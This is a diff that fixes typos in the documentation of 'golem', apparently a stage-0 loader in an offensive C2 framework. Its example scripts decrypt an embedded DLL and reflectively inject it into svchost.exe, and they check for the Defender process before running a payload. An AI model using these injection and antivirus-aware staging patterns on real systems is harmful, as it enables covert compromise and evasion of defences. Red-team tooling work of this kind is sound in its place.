@@ -23,7 +23,7 @@ cargo build --release && \
 ```
 
 ## Golem embedded files
-The Eldritch interpreter can embed files at compile time. To interact with these assets use the `assets` module in eldritch. In addition to programatic access the embedded files can be automatically executed at run time. If no other option is specified `-i` or a file path, golem will iterate over every instance of `main.eld` in the embedded assets launching each one as a seperate thread. This behavior is desirable when trying to perform recon or deploy persistence quickly.
+The Eldritch interpreter can embed files at compile time. To interact with these assets use the `assets` module in eldritch. In addition to programmatic access the embedded files can be automatically executed at run time. If no other option is specified `-i` or a file path, golem will iterate over every instance of `main.eld` in the embedded assets launching each one as a separate thread. This behavior is desirable when trying to perform recon or deploy persistence quickly.
 
 ## Golem as a stage 0
 Golem can also be used as a stage 0 to load imix or other c2 agents.
@@ -50,7 +50,7 @@ def decrypt(payload_bytes):
 
 def main():
     if is_windows():
-        for proc in proccess.list():
+        for proc in process.list():
             if "svchost.exe" in proc['name']:
                 let enc_bytes = assets.read_bytes("imix.dll")
                 sys.dll_reflect(decrypt(enc_bytes), proc['pid'], 'imix_main')
@@ -63,7 +63,7 @@ main()
 
 ```python
 def main():
-    for proc in proccess.list():
+    for proc in process.list():
         if "MsMpEng.exe" in proc['name']:
             return
     run_payload()
